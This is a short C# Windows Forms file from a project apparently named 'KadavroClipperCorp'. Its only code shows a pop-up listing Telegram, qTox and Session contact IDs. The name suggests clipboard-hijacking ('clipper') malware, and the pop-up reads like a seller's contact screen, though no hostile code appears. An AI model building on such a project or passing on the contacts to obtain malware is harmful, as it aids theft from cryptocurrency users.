using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KadavroClipperCorp
{
    public partial class Form1: Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            MessageBox.Show("Telegram: https://t.me/komokunique" +
                "qTox: 0DF8A8515581B7BE24D2FC1F107AD38E20E6F26F6DF83E6C30AB49FF4707BD5720A0F4A38AB5" +
                "Session: 05cdb27d043d43f28ff85b32c1f3502bb8e1a976265966dd44803c28ad47955200" );
        }
    }
}
